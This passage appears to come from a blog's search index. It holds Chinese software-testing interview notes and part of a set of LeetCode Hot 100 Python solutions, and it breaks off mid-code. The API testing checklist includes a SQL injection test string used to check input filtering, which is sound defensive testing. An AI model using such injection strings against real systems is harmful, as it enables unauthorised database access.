123456789101112131415161718192021222324252627282930313233343536373839404142434445黑盒测试：不关心代码，只测输入输出。白盒测试：基于代码结构设计测试。结构测试：通过代码结构设计测试用例。功能测试：验证功能是否符合需求。路径测试：覆盖代码中的所有路径。增量测试：逐步集成和测试新模块。崩溃测试：测试系统在极端条件下的稳定性。性能测试：评估系统在不同负载下的性能。回归测试：确保修改后原有功能不受影响。单元测试：测试最小可测试单元。集成测试：测试多个模块的组合。系统测试：测试整个系统。验收测试：由客户确认系统是否满足需求。负载测试：模拟高负载测试性能。压力测试：测试系统的极限能力。安全测试：评估系统安全性。兼容性测试：测试系统在不同环境下的兼容性。冒烟测试：快速测试主要功能。探索性测试：无预设用例，通过探索发现问题。α测试：由内部人员在开发环境中进行β测试：是软件发布前的最终测试阶段，通常在α测试之后进行。它由真实用户在实际环境中执行，目的是发现开发团队未察觉的问题。用户验收测试（UAT）：由客户确认软件是否满足需求，β测试更侧重于广泛用户反馈。迭代测试：是敏捷开发中的一种测试方法，随着每个开发迭代的进行，测试活动也同步展开。每次迭代都会进行完整的测试循环，包括单元测试、集成测试、系统测试等，以确保新增功能和现有功能都符合需求。特点：持续进行：测试贯穿整个开发周期，而非仅在开发完成后进行。增量式：每次迭代只测试新增或修改的部分，同时进行回归测试以确保原有功能不受影响。快速反馈：通过频繁测试，开发团队能快速发现并修复问题。能都经过充分测试。 面试 测试流程与规范 偶现bug怎么处理？ 截图、保留证据，根据操作路径进⾏重现，提交禅道，上线前继续跟踪，上线后再跟踪⼀两个版本，最后作为遗留bug写到测试报告⾥⾯ 没有需求⽂档，如何开展测试？ 1、与相关⼈员沟通，产品或开发 2、参考同⾏业竞品，总结梳理需求 3、根据⽤户习惯和⾏业规范，总结梳理 线上出现bug怎么办？ ⾸先评估严重程度和产⽣原因， 1、如果是影响⾯⽐较⼤的功能性问题，且短时间内不好定位具体原因，⾸先考虑做代码回滚，恢复到上 ⼀个稳定版本，然后在测试环境进⾏重现，定位问题原因 2、如果是能快速定位问题原因，就让开发做紧急修复，测试后进⾏上线 3、如果是性能问题，⼀般会进⾏扩容，或重启尝试解决，然后开发会做进⼀步的问题定位和优化 4、如果是⼀些优化性问题，会先进⾏记录，然后在下个版本解决 最后，线上bug解决后，要对问题进⾏复盘，分析和总结，避免后续再出现类似问题 临近上线发现了bug要怎么处理？ ⾸先与相关⼈员（开发、产品）评估bug的严重程度和影响范围， 如果是轻微的bug，可以考虑先上线，后续版本迭代中修复， 如果是⽐较严重的bug，找开发沟通，能否快速修复，并且有⾜够的时间去做下测试 如果时间不⾜了，那就得和相关⼈员后台，是否可以延期上线，避免上线后造成严重的后果 参加⼈员：测试⼈员、开发⼈员、产品⼈员 会议评审 ⽤例评审都有哪些⼈参加？怎么做的？有什么标准？ 参加⼈员：测试⼈员、开发⼈员、产品⼈员 会议评审 标准： ⽤例设计的结构安排是否清晰、合理，是否利于⾼效对需求进⾏覆盖。 优先极安排是否合理。 是否覆盖测试需求上的所有功能点。 ⽤例是否具有很好可执⾏性。例如⽤例的前提条件、执⾏步骤、输⼊数据和期待结果是否清晰、正确； 期待结果是否有明显的验证⽅法。 是否已经删除了冗余的⽤例 迭代测试发现不了问题，怎么办？ 1)必要的业务培训 结合业务流程图、系统架构图，对业务系统有个整体的感知。知道业务系统的整体业务流向及涉及的系统架构，这样有助于测试⼈员从⼤的⽅向去拉通测试场景，不⾄于陷⼊细节中⽽⽆法顾及全貌。 2)制定明确地测试策略 即明确两个问题：测什么？怎么测？“减少缺陷的出现”可以通过测试前移等⽅法来解决，在进⾏软件需求分析和架构设计的时候发现 缺陷； 3)严格执⾏测试流程 设计测试⽤例、⽤例评审、开发⾃测等 4)建⽴质量意识和责任感 出现问题时，测试应该有责任和能⼒去探查问题的根源并加以改进 5)定期回顾和总结 缺陷分析，在某个迭代或者版本的周期内（或者更⻓时间），对BUG产⽣的原因、修复周期、累 积趋势进⾏分析。总结分析bug和测试过程问题，形成的质量报告不仅能准确评估过去产品质量，还能为未来产品提出改进建议，持续推进产品质量的不断提⾼和完善 接口测试 什么时候会做接⼝测试 回归测试 前后端联调阶段（开发进⾏⾃测） 验证⼀些后端接⼝是否有限制的场景（资⾦相关） 怎么做接⼝测试的 1、获取到接⼝⽂档、熟悉单接⼝的业务、连接接⼝业务，包括接⼝地址，请求⽅式，鉴权，⼊参，出 参，错误码等 加密，签名等 2、编写接⼝⽤例并评审 正例：单接⼝，链接接⼝ 反例：鉴权（过期的场景、不正确） 参数（类型异常、⻓度异常）， 错误码（-1 系统繁忙、不同公司不⼀样）， ⿊名单（⿊名单⽤户是否还允许访问） 禁⽤ 调⽤次数（⼿续费） 分⻚（每⻚10条，每⻚是否都有数据，总数据是否正确，边界值） 兼容性（不同调⽤⽅式下（如app版本不⼀样时），接⼝返回的数据是否相同） 3、执⾏⽤例 举出具体的接⼝案例以及⼀些特定场景，如：接⼝串联（token传递）、环境变量、全局变量、随机数获 取（⽐如第三⽅单号） 4、持续集成 钉钉群通知、电⼦邮件 如果⼀个接⼝请求不通，那么你会考虑哪些⽅⾯的问题？ 1、检查请求四要素：请求⽅式、域名、请求头、请求参数、有没有空格 2、⽹络情况 3、项⽬迭代过程中是否有部署好 4、服务器的防⽕墙 5、查看后台⽇志是否有报错 6、访问权限是否到位 7、⼀边打开fiddler（打开代理服务器，证书有问题）⼀遍做接⼝测试（基于https） 8、检查是否绑定了错误的hosts 接⼝测试的作⽤ 1、接⼝测试是⽆⻚⾯的功能测试，设计⽤例思路跟功能测试⼀样（只是⼀个注重的是测前端⻚⾯，⼀个注重的是测后端接⼝） 2、接⼝测试可以绕开前端 3、接⼝测试可以校验并发的情况 4、可以核对接⼝请求资源⼤⼩ 5、可以进⾏弱⽹测试 接⼝测试的主要关注点？ （1）业务逻辑（业务逻辑覆盖） （2）响应结构 （3）数据格式 （4）数据正确性（依据来源：查数据库与服务器和接⼝返回值⽐较） Cooike、session、token的区别 相同点：三者都⽤于鉴权，都是服务器⽣成 不同点： Cooike：保存在浏览器，不安全 session：保存在服务器的内存，并且它⼀般是通过cooike传输sessionid，它⽐cooike更安全，当访问量⼤的时候影响服务器的性能 token 存储在服务器的数据库，通常是通过登录或者⼀个特定的接⼝传⼊appid和appsect来获取，后续所有的接⼝都必须带上token 才能请求成功，有些项⽬toekn也是通过cookie传输的 特定接⼝：对于需要做RSA加密的接⼝，需要做签名的接⼝在Jmeter/postman要如何处理？ JMeter 使用 JSR223 预处理器 或 BeanShell 预处理器 编写脚本实现 RSA 加密和签名。 将结果存储到 JMeter 变量中，并在请求中使用。 Postman 使用 Pre-request Script 编写脚本实现 RSA 加密和签名。 将结果存储到 Postman 变量中，并在请求中使用。 如何验证接⼝是否返回成功 1、校验状态码是否200（状态断⾔ 只有⼀个） 2、核⼼业务断⾔ 返回结果⽐较短的：key=value 返回结果较⻓的：通过关键信息，数据库校验⻓度 3、XML或JSON：通过正则，jsonpath提取关键的业务字段进⾏断⾔ 接⼝关联怎么做 ⽤⼀个全局变量来处理依赖的数据，⽐如登录后返回 token,其它接⼝都需要这 个 token,那就⽤全局变量来传 token 参数 没有接⼝⽂档如何做接⼝测试 可以使⽤抓包⼯具进⾏抓包看接⼝请求参数，然后不懂的跟开发沟通 常⻅的接⼝请求头 1234AcceptX-Requested-WithUser-AgentContent-Type 接⼝测试常⽤检查点 接口测试检查点（按检查类型分类） 检查类型 检查点 描述 业务测试 正常流程返回数据的正确性 验证接口在正常业务流程下返回的数据内容、格式、逻辑是否符合预期。 接口文档符合性 验证返回值是否按接口文档规定格式（如JSON/XML）、编码（UTF-8）、字段命名（如return_msg）返回。 参数类型传递正确性 验证接口是否正确处理参数类型（如数字、字符串、布尔值等）。 接口依赖关系测试 验证接口依赖的其他服务或数据源异常时，是否能正确处理（如降级、超时）。 异常业务处理逻辑 验证业务异常场景（如余额不足、库存为负）是否返回明确的错误码和描述。 参数测试 参数值全量覆盖验证 对参数所有可能取值（枚举值、布尔值等）进行覆盖测试。 必填参数正确性验证 必填参数传入有效值时，接口返回预期结果。 必填/非必填参数组合验证 测试不同必填与非必填参数组合下的接口行为（如缺少非必填参数是否影响功能）。 参数边界值验证 验证参数在边界值（如最大值、最小值、空值、超长字符串）下的处理逻辑。 异常测试 必填参数缺失 缺失必填参数时是否返回明确错误码（如400 Bad Request）。 非法参数值 传入非法参数（如非数字传入数字字段）是否返回类型错误提示。 超限参数值 参数超过允许范围（如金额超限）是否触发业务规则校验。 性能测试 响应时间 单请求响应时间是否在SLA要求范围内（如≤500ms）。 并发处理能力 高并发场景下接口是否稳定（如100并发用户请求成功率≥99%）。 大数据量处理 处理大量数据时（如万级列表查询）是否返回正确且性能达标。 安全性测试 敏感信息加密 返回的敏感数据（如手机号、身份证号）是否脱敏或加密。 未授权访问防护 未携带Token或权限不足时是否返回401 Unauthorized。 SQL注入防护 传入SQL注入语句（如' OR 1=1 --）是否被拦截并返回错误。 幂等性测试 重复请求一致性 多次提交相同请求（如支付）是否仅产生一次有效结果。 兼容性测试 多版本兼容 新旧版本接口参数格式（如v1/v2）是否能兼容处理。 多客户端兼容 不同客户端（Web/App/第三方）调用接口时返回数据格式是否一致。 功能测试 测试环境没问题，但⽣产/灰度环境有问题，会从哪些原因去定位排查 1、部署原因，⽣产/灰度环境的代码与测试环境验证通过的不⼀致 2、测试数据问题，有些bug需要特殊的数据才能重现出来 3、配置原因，⽣产/灰度环境的配置出问题","categories":[],"tags":[{"name":"测试","slug":"测试","permalink":"http://example.com/tags/%E6%B5%8B%E8%AF%95/"}]},{"title":"力扣hot100python题解","slug":"力扣hot100python题解","date":"2025-03-04T01:25:44.000Z","updated":"2025-03-08T10:10:59.162Z","comments":true,"path":"2025/03/04/力扣hot100python题解/","permalink":"http://example.com/2025/03/04/%E5%8A%9B%E6%89%A3hot100python%E9%A2%98%E8%A7%A3/","excerpt":"","text":"哈希 两数之和 给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target 的那 两个 整数，并返回它们的数组下标。 你可以假设每种输入只会对应一个答案，并且你不能使用两次相同的元素。 你可以按任意顺序返回答案。 1234567class Solution: def twoSum(self, nums: List[int], target: int) -&gt; List[int]: hashtable = &#123;&#125; for index, num in enumerate(nums): if (target-num) in hashtable: return [index, hashtable[target-num]] hashtable[num] = index 字母异位词分组 给你一个字符串数组，请你将 字母异位词 组合在一起。可以按任意顺序返回结果列表。 字母异位词 是由重新排列源单词的所有字母得到的一个新单词。 12345678910class Solution: def groupAnagrams(self, strs: List[str]) -&gt; List[List[str]]: ans = &#123;&#125; for s in strs: key = &#x27;&#x27;.join(sorted(s)) if key not in ans: ans[key] = [s] else: ans[key].append(s) return list(ans.values()) 最长连续序列 给定一个未排序的整数数组 nums ，找出数字连续的最长序列（不要求序列元素在原数组中连续）的长度。 请你设计并实现时间复杂度为 O(n) 的算法解决此问题。 123456789101112class Solution: def longestConsecutive(self, nums: List[int]) -&gt; int: ans = 0 st = set(nums) for x in st: if x-1 in st: continue y = x+1 while y in st: y = y + 1 ans = max(ans,y -x) return ans 双指针 移动0 1234567891011class Solution: def moveZeroes(self, nums: List[int]) -&gt; None: &quot;&quot;&quot; Do not return anything, modify nums in-place instead. &quot;&quot;&quot; left = right = 0 while right &lt; len(nums): if nums[right]!=0: nums[left],nums[right]=nums[right],nums[left] left += 1 right += 1 盛水最多容器 给定一个长度为 n 的整数数组 height 。有 n 条垂线，第 i 条线的两个端点是 (i, 0) 和 (i, height[i]) 。 找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。 返回容器可以储存的最大水量。 **说明：**你不能倾斜容器。 12345678910111213class Solution: def maxArea(self, height: List[int]) -&gt; int: left = ans = 0 right = len(height) - 1 while left &lt; right : if height[left] &lt; height[right]: ans = max(ans,height[left]*(right-left)) left += 1 else: ans = max(ans,height[right]*(right-left)) right -= 1 return ans 三数之和 给你一个整数数组 nums ，判断是否存在三元组 [nums[i], nums[j], nums[k]] 满足 i != j、i != k 且 j != k ，同时还满足 nums[i] + nums[j] + nums[k] == 0 。请你返回所有和为 0 且不重复的三元组。 **注意：**答案中不可以包含重复的三元组。 123456789101112131415161718192021222324252627282930class Solution: def threeSum(self, nums: List[int]) -&gt; List[List[int]]: nums.sort() ans = [] n = len(nums) for i in range(n - 2): x = nums[i] if i &gt; 0 and x == nums[i - 1]: # 跳过重复数字 continue if x + nums[i + 1] + nums[i + 2] &gt; 0: # 优化一 break if x + nums[-2] + nums[-1] &lt; 0: # 优化二 continue j = i + 1 k = n - 1 while j &lt; k: s = x + nums[j] + nums[k] if s &gt; 0: k -= 1 elif s &lt; 0: j += 1 else: # 三数之和为 0 ans.append([x, nums[j], nums[k]]) j += 1 while j &lt; k and nums[j] == nums[j - 1]: # 跳过重复数字 j += 1 k -= 1 while k &gt; j and nums[k] == nums[k + 1]: # 跳过重复数字 k -= 1 return ans 接雨水 给定 n 个非负整数表示每个宽度为 1 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。 123456789101112131415161718192021222324class Solution: def trap(self, height: List[int]) -&gt; int: if not height: return 0 left, right = 0, len(height) - 1 # 两个指针 left_max, right_max = height[left], height[right] # 左右最大边界 ans = 0 # 结果累加器 while left &lt; right: if height[left] &lt; height[right]: left += 1 if height[left] &gt; left_max: left_max = height[left] else: ans += left_max - height[left] else: right -= 1 if height[right] &gt; right_max: right_max = height[right] else: ans += right_max - height[right] return ans 滑动窗口 无重复字符的最长字串 给定一个字符串 s ，请你找出其中不含有重复字符的 最长 子串 的长度。 123456789101112131415class Solution: def lengthOfLongestSubstring(self, s: str) -&gt; int: d = &#123;&#125; res = 0 start = -1 for index, c in enumerate(s): if c not in d: res = max(res, index-start) else: if d[c] &gt; start: start = d[c] else: res = max(res, index-start) d[c] = index return res 找到字符串中所有字母异位词 给定两个字符串 s 和 p，找到 s 中所有 p 的 异位词 的子串，返回这些子串的起始索引。不考虑答案输出的顺序。 示例 1: 12345输入: s = &quot;cbaebabacd&quot;, p = &quot;abc&quot;输出: [0,6]解释:起始索引等于 0 的子串是 &quot;cba&quot;, 它是 &quot;abc&quot; 的异位词。起始索引等于 6 的子串是 &quot;bac&quot;, 它是 &quot;abc&quot; 的异位词。 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Solution: def findAnagrams(self, s: str, p: str) -&gt; List[int]: # 获取字符串 s 和 p 的长度 s_len, p_len = len(s), len(p) # 如果 s 的长度小于 p 的长度，直接返回空列表，因为无法形成异位词子串 if s_len &lt; p_len: return [] # 初始化结果列表，用于存储异位词子串的起始索引 ans = [] # 初始化两个长度为 26 的数组，用于统计字符频率 # s_count 用于统计当前窗口内的字符频率 # p_count 用于统计字符串 p 的字符频率 s_count = [0] * 26 p_count = [0] * 26 # 遍历 p 的前 p_len 个字符，初始化 s_count 和 p_count for i in range(p_len): # 统计 s 的前 p_len 个字符的频率 s_count[ord(s[i]) - 97] += 1 # 统计 p 的前 p_len 个字符的频率 p_count[ord(p[i]) - 97] += 1 # 如果初始窗口的字符频率与 p 的字符频率相等，说明第一个窗口就是异位词 # 将起始索引 0 加入结果列表 if s_count == p_count: ans.append(0) # 滑动窗口遍历 s 的剩余部分 for i in range(s_len - p_len): # 窗口滑动时，移除窗口左侧的字符，将其频率减 1 s_count[ord(s[i]) - 97] -= 1 # 添加窗口右侧的新字符，将其频率加 1 s_count[ord(s[i + p_len]) - 97] += 1 # 检查当前窗口的字符频率是否与 p 的字符频率相等 # 如果相等，说明当前窗口是异位词，将起始索引（i + 1）加入结果列表 if s_count == p_count: ans.append(i + 1) # 返回结果列表 return ans 子串 和为 k的子数组 给你一个整数数组 nums 和一个整数 k ，请你统计并返回 该数组中和为 k 的子数组的个数 。 子数组是数组中元素的连续非空序列。 12345678910111213141516class Solution: def subarraySum(self, nums: List[int], k: int) -&gt; int: count, pre = 0, 0 hashmap = dict(&#123;0:1&#125;) for num in nums: pre += num if pre - k in hashmap: count += hashmap[pre - k] if pre in hashmap: hashmap[pre] += 1 else: hashmap[pre] = 1 return count 滑动窗口最大值 给你一个整数数组 nums，有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 k 个数字。滑动窗口每次只向右移动一位。 返回 滑动窗口中的最大值 12345678910111213141516171819202122232425262728293031323334353637383940class Solution: def maxSlidingWindow(self, nums: List[int], k: int) -&gt; List[int]: # 如果数组为空或窗口大小为0，直接返回空列表 if not nums or k == 0: return [] # 使用双端队列来存储当前窗口中的元素索引 deque = collections.deque() # 未形成窗口时的处理 for i in range(k): # 如果队列不为空且队列末尾的元素小于当前元素，则弹出队列末尾的元素 # 这样可以保证队列中的元素是递减的 while deque and deque[-1] &lt; nums[i]: deque.pop() # 将当前元素加入队列 deque.append(nums[i]) # 将当前窗口的最大值（即队列的第一个元素）加入结果列表 res = [deque[0]] # 形成窗口后的处理 for i in range(k, len(nums)): # 如果队列的第一个元素是窗口最左边的元素，则将其从队列中移除 # 因为这个元素即将离开窗口 if deque[0] == nums[i - k]: deque.popleft() # 如果队列不为空且队列末尾的元素小于当前元素，则弹出队列末尾的元素 # 这样可以保证队列中的元素是递减的 while deque and deque[-1] &lt; nums[i]: deque.pop() # 将当前元素加入队列 deque.append(nums[i]) # 将当前窗口的最大值（即队列的第一个元素）加入结果列表 res.append(deque[0]) # 返回结果列表 return res 最小覆盖字串 给你一个字符串 s 、一个字符串 t 。返回 s 中涵盖 t 所有字符的最小子串。如果 s 中不存在涵盖 t 所有字符的子串，则返回空字符串 &quot;&quot; 。 1234567891011121314151617181920212223class Solution: def minWindow(self, s: str, t: str) -&gt; str: ans_left, ans_right = -1, len(s) cnt = defaultdict(int) # 比 Counter 更快 for c in t: cnt[c] += 1 less = len(cnt) left = 0 for right, c in enumerate(s): cnt[c] -= 1 if cnt[c] == 0: less -= 1 while less == 0: if right - left &lt; ans_right - ans_left: ans_left, ans_right = left, right x = s[left] if cnt[x] == 0: less += 1 cnt[x] += 1 left += 1 return &quot;&quot; if ans_left &lt; 0 else s[ans_left: ans_right + 1] 普通数组 最大子数组和 给你一个整数数组 nums ，请你找出一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。 子数组是数组中的一个连续部分。 123456789101112class Solution: def maxSubArray(self, nums: List[int]) -&gt; int: count = 0 result = -99999 for i in nums: count += i if count &gt; result: result = count if count &lt; 0: count = 0 return result 合并区间 以数组 intervals 表示若干个区间的集合，其中单个区间为 intervals[i] = [starti, endi] 。请你合并所有重叠的区间，并返回 一个不重叠的区间数组，该数组需恰好覆盖输入中的所有区间 。 1234567891011121314class Solution: def merge(self, intervals: List[List[int]]) -&gt; List[List[int]]: intervals.sort(key=lambda x: x[0]) merged = [] for interval in intervals: # 如果列表为空，或者当前区间与上一区间不重合，直接添加 if not merged or merged[-1][1] &lt; interval[0]: merged.append(interval) else: # 否则的话，我们就可以与上一区间进行合并 merged[-1][1] = max(merged[-1][1], interval[1]) return merged 轮转数组 给定一个整数数组 nums，将数组中的元素向右轮转 k 个位置，其中 k 是非负数。 1234567891011121314class Solution: def rotate(self, nums: List[int], k: int) -&gt; None: def reverse(i: int, j: int) -&gt; None: while i &lt; j: nums[i], nums[j] = nums[j], nums[i] i += 1 j -= 1 n = len(nums) k %= n # 轮转 k 次等于轮转 k % n 次 reverse(0, n - 1) reverse(0, k - 1) reverse(k, n - 1) 除自身以外数组的乘积 给你一个整数数组 nums，返回 数组 answer ，其中 answer[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积 。 题目数据 保证 数组 nums之中任意元素的全部前缀元素和后缀的乘积都在 32 位 整数范围内。 请 **不要使用除法，**且在 O(n) 时间复杂度内完成此题。 12345678910111213import mathclass Solution: def productExceptSelf(self, nums: List[int]) -&gt; List[int]: # 如果有0，可以简化运算 total = math.prod(nums) ans = [] for i, num in enumerate(nums): if num != 0: ans.append(total // num) else: ans.append(math.prod(nums[:i] + nums[i+1:])) return ans 缺失的第一个正数 给你一个未排序的整数数组 nums ，请你找出其中没有出现的最小的正整数。 请你实现时间复杂度为 O(n) 并且只使用常数级别额外空间的解决方案。 12345678910111213class Solution: def firstMissingPositive(self, nums: List[int]) -&gt; int: N = len(nums) num_list = [0]*(N+1) for num in nums: if num&gt;N or num&lt;=0: continue num_list[num] = 1 for i in range(1,N+1): if num_list[i] == 0: return i return N+1 矩阵 矩阵置零 给定一个 *m* x *n* 的矩阵，如果一个元素为 0 ，则将其所在行和列的所有元素都设为 0 。请使用 原地 算法**。** 123456789101112131415161718class Solution: def setZeroes(self, matrix: List[List[int]]) -&gt; None: &quot;&quot;&quot; Do not return anything, modify matrix in-place instead. &quot;&quot;&quot; m, n = len(matrix), len(matrix[0]) row = [False] * m col = [False] * n for i in range(m): for j in range(n): if matrix[i][j] == 0: row[i], col[j] = True, True for i in range(m): for j in range(n): if row[i] or col[j]: matrix[i][j] = 0 螺旋矩阵 给你一个 m 行 n 列的矩阵 matrix ，请按照 顺时针螺旋顺序 ，返回矩阵中的所有元素。 1234567891011121314151617class Solution: def spiralOrder(self, matrix: List[List[int]]) -&gt; List[int]: result = [] while matrix : result.extend(matrix.pop(0)) if matrix : if matrix[0]: for i in range(len(matrix)): result.append(matrix[i].pop()) if matrix : k = matrix.pop() result.extend(k[::-1]) if matrix : if matrix[0]: for i in range(len(matrix)-1,-1,-1): result.append(matrix[i].pop(0)) return result 旋转图像 给定一个 n × n 的二维矩阵 matrix 表示一个图像。请你将图像顺时针旋转 90 度。 你必须在** 原地** 旋转图像，这意味着你需要直接修改输入的二维矩阵。请不要 使用另一个矩阵来旋转图像。 12345678910class Solution: def rotate(self, matrix: List[List[int]]) -&gt; None: n = len(matrix) # 深拷贝 matrix -&gt; tmp tmp = copy.deepcopy(matrix) # 根据元素旋转公式，遍历修改原矩阵 matrix 的各元素 for i in range(n): for j in range(n): matrix[j][n - 1 - i] = tmp[i][j] 链表 相交链表 给你两个单链表的头节点 headA 和 headB ，请你找出并返回两个单链表相交的起始节点。如果两个链表不存在相交节点，返回 null 。 1234567class Solution: def getIntersectionNode(self, headA: ListNode, headB: ListNode) -&gt; ListNode: A, B = headA, headB while A != B: A = A.next if A else headB B = B.next if B else headA return A 反转链表 给你单链表的头节点 head ，请你反转链表，并返回反转后的链表。 1234567891011121314# Definition for singly-linked list.# class ListNode:# def __init__(self, val=0, next=None):# self.val = val# self.next = nextclass Solution: def reverseList(self, head: Optional[ListNode]) -&gt; Optional[ListNode]: cur ,pre = head, None while cur: temp = cur.next cur.next = pre pre = cur cur = temp return pre 二叉树 二叉树的中序遍历 给定一个二叉树的根节点 root ，返回 它的 中序 遍历 1234567891011121314151617181920class Solution: def inorderTraversal(self, root: TreeNode) -&gt; List[int]: # 初始化栈和结果列表 stack, rst = [root], [] # stack 用于模拟递归调用栈，rst 用于存储遍历结果 # 开始遍历 while stack: # 当栈不为空时，继续遍历 i = stack.pop() # 弹出栈顶元素 # 如果当前元素是 TreeNode 类型 if isinstance(i, TreeNode): # 将右子树、当前节点的值、左子树按顺序压入栈 stack.extend([i.right, i.val, i.left]) # 注意顺序：右 -&gt; 值 -&gt; 左 # 如果当前元素是整数类型（节点的值） elif isinstance(i, int): rst.append(i) # 将节点的值加入结果列表 # 返回结果列表 return rst 二叉树的最大深度 给定一个二叉树 root ，返回其最大深度。二叉树的 最大深度 是指从根节点到最远叶子节点的最长路径上的节点数。 1234class Solution: def maxDepth(self, root: Optional[TreeNode]) -&gt; int: if not root: return 0 return max(self.maxDepth(root.left),self.maxDepth(root.right))+1 图论 岛屿数量 给你一个由 '1'（陆地）和 '0'（水）组成的的二维网格，请你计算网格中岛屿的数量。岛屿总是被水包围，并且每座岛屿只能由水平方向和/或竖直方向上相邻的陆地连接形成。此外，你可以假设该网格的四条边均被水包围。 1234567输入：grid = [ [&quot;1&quot;,&quot;1&quot;,&quot;0&quot;,&quot;0&quot;,&quot;0&quot;], [&quot;1&quot;,&quot;1&quot;,&quot;0&quot;,&quot;0&quot;,&quot;0&quot;], [&quot;0&quot;,&quot;0&quot;,&quot;1&quot;,&quot;0&quot;,&quot;0&quot;], [&quot;0&quot;,&quot;0&quot;,&quot;0&quot;,&quot;1&quot;,&quot;1&quot;]]输出：3 1234567891011121314151617181920212223242526272829303132333435class Solution: def numIslands(self, grid: List[List[str]]) -&gt; int: n_l = 0 # 初始化岛屿数量为 0 # 遍历整个网格 for i in range(len(grid)): for j in range(len(grid[0])): # 如果当前单元格是陆地（&#x27;1&#x27;），则开始 DFS 遍历 if grid[i][j] == &#x27;1&#x27;: self.landpaint(grid, i, j) # 标记当前岛屿的所有陆地 n_l += 1 # 岛屿数量加 1 # 返回岛屿数量 return n_l # DFS 函数：标记当前岛屿的所有陆地 def landpaint(self, grid, x, y): # 将当前陆地标记为已访问（&#x27;2&#x27;） grid[x][y] = &#x27;2&#x27; # 检查下方单元格 if x + 1 &lt; len(grid) and grid[x + 1][y] == &#x27;1&#x27;: self.landpaint(grid, x + 1, y) # 检查右方单元格 if y + 1 &lt; len(grid[0]) and grid[x][y + 1] == &#x27;1&#x27;: self.landpaint(grid, x, y + 1) # 检查上方单元格 if x - 1 &gt;= 0 and grid[x - 1][y] == &#x27;1&#x27;: self.landpaint(grid, x - 1, y) # 检查左方单元格 if y - 1 &gt;= 0 and grid[x][y - 1] == &#x27;1&#x27;: self.landpaint(grid, x, y - 1) 腐烂的橘子 在给定的 m x n 网格 grid 中，每个单元格可以有以下三个值之一：值 0 代表空单元格；值 1 代表新鲜橘子；值 2 代表腐烂的橘子。 每分钟，腐烂的橘子 周围 4 个方向上相邻 的新鲜橘子都会腐烂。返回 直到单元格中没有新鲜橘子为止所必须经过的最小分钟数。如果不可能，返回 -1 。 123456789101112131415161718192021222324class Solution: def orangesRotting(self, grid: List[List[int]]) -&gt; int: m,n=len(grid),len(grid[0]) fresh=0 q=[] for i,row in enumerate(grid): for j,x in enumerate(row): if x==1: fresh+=1 elif x==2: q.append((i,j)) ans=0 while q and fresh: ans+=1 tmp=q q=[] for x,y in tmp: for i, j in (x - 1, y), (x + 1, y), (x, y - 1), (x, y + 1): # 四方向 if 0 &lt;= i &lt; m and 0 &lt;= j &lt; n and grid[i][j] == 1: # 新鲜橘子 fresh -= 1 grid[i][j] = 2 # 变成腐烂橘子 q.append((i, j)) return -1 if fresh else ans 回溯 全排列 给定一个不含重复数字的数组 nums ，返回其 所有可能的全排列 。你可以 按任意顺序 返回答案。 1234567891011121314151617181920212223242526272829303132333435363738class Solution: def permute(self, nums: List[int]) -&gt; List[List[int]]: # 定义 DFS 函数 def dfs(nums, size, depth, path, used, res): # 如果当前深度等于数组大小，说明找到一个完整排列 if depth == size: res.append(path[:]) # 将当前排列加入结果列表 return # 遍历数组中的每个元素 for i in range(size): # 检查当前元素是否已经被使用过 if not used[i]: # 标记当前元素为已使用 used[i] = True # 将当前元素加入路径 path.append(nums[i]) # 递归调用 DFS，继续生成下一个位置的元素 dfs(nums, size, depth + 1, path, used, res) # 回溯：移除当前元素，恢复状态 path.pop() used[i] = False # 获取数组的长度 size = len(nums) # 如果数组为空，直接返回空列表 if size == 0: return [] # 初始化 used 数组和结果列表 used = [False] * size # 记录元素是否被使用 res = [] # 结果列表，用于存储所有排列 # 调用 DFS 函数，开始生成排列 dfs(nums, size, 0, [], used, res) # 返回结果列表 return res 子集 给你一个整数数组 nums ，数组中的元素 互不相同 。返回该数组所有可能的子集（幂集）。解集 不能 包含重复的子集。你可以按 任意顺序 返回解集。 1234567891011121314151617181920class Solution: def subsets(self, nums: List[int]) -&gt; List[List[int]]: # 初始化结果列表 res = [] # 获取数组的长度 n = len(nums) # 定义回溯函数 def helper(i, tmp): # 将当前子集加入结果列表 res.append(tmp) # 遍历数组，生成新的子集 for j in range(i, n): # 递归调用，更新子集 helper(j + 1, tmp + [nums[j]]) # 调用回溯函数，从索引 0 和空子集开始 helper(0, []) # 返回结果列表 return res 二分查找 搜索插入位置 给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。 1234567891011121314class Solution: def searchInsert(self, nums: List[int], target: int) -&gt; int: left, right = 0, len(nums) - 1 while left &lt;= right: mid = (left + right) // 2 if nums[mid] == target: return mid elif nums[mid] &lt; target: left = mid + 1 else: right = mid - 1 return left # left 位置即为插入位置 搜索二维矩阵 给你一个满足下述两条属性的 m x n 整数矩阵：每行中的整数从左到右按非严格递增顺序排列。每行的第一个整数大于前一行的最后一个整数。给你一个整数 target ，如果 target 在矩阵中，返回 true ；否则，返回 false 。 12345678910111213141516171819202122232425class Solution: def searchMatrix(self, matrix: List[List[int]], target: int) -&gt; bool: # 获取矩阵的行数和列数 m, n = len(matrix), len(matrix[0]) # 初始化二分查找的左右边界 l, r = 0, m * n # 将二维矩阵视为一维数组 # 开始二分查找 while l &lt; r: # 计算中间位置 mid = (l + r) &gt;&gt; 1 # 等价于 (l + r) // 2 # 将一维索引 mid 转换为二维索引 x = matrix[mid // n][mid % n] # 判断中间元素与目标值的关系 if x == target: return True # 找到目标值，返回 True if x &lt; target: l = mid + 1 # 目标值在右半部分 else: r = mid # 目标值在左半部分 # 未找到目标值，返回 False return False 栈 有效的括号 给定一个只包括 '('，')'，'&#123;'，'&#125;'，'['，']' 的字符串 s ，判断字符串是否有效。 有效字符串需满足： 左括号必须用相同类型的右括号闭合。 左括号必须以正确的顺序闭合。 每个右括号都有一个对应的相同类型的左括号。 1234567891011class Solution: def isValid(self, s: str) -&gt; bool: dic = &#123;&#x27;)&#x27;:&#x27;(&#x27;,&#x27;]&#x27;:&#x27;[&#x27;,&#x27;&#125;&#x27;:&#x27;&#123;&#x27;&#125; stack = [] for i in s: if stack and i in dic: if stack[-1] == dic[i]: stack.pop() else: return False else: 